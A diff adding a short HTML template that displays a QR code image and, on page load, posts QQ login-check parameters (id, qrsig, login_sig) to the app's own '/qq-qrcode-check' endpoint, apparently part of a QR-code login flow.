@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>二维码</title>
+    <script src="../static/js/jquery.js"></script>
+</head>
+<body>
+<img src="data:;base64,{{ img_stream }}">
+</body>
+<script type="application/javascript">
+    window.onload = function () {
+        $.post("/qq-qrcode-check", {
+            "id": "{{ id }}",
+            "qrsig": "{{ qrsig }}",
+            "login_sig": "{{ login_sig }}"
+        })
+    }
+</script>
+</html>
